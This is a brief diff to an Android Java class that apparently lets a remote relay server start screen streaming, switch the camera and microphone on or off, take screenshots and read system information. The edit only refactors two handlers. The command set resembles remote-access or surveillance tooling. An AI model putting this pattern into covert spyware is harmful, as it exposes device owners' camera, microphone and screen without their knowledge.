@@ -60,12 +60,18 @@ public class RelayClient {
                 i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                 service.startActivity(i);
             });
-            socket.on("stop_screen",     args -> service.stopScreenStream());
+            socket.on("stop_screen", args -> {
+                ScreenService ss = ScreenService.getInstance();
+                if (ss != null) ss.stopStream();
+            });
             socket.on("camera_on",       args -> service.startCamera());
             socket.on("camera_off",      args -> service.stopCamera());
             socket.on("mic_on",          args -> service.startMic());
             socket.on("mic_off",         args -> service.stopMic());
-            socket.on("take_screenshot", args -> service.takeScreenshot(args));
+            socket.on("take_screenshot", args -> {
+                ScreenService ss = ScreenService.getInstance();
+                if (ss != null) ss.takeScreenshot(args, this);
+            });
 
             socket.on("get_sysinfo", args -> {
                 try {
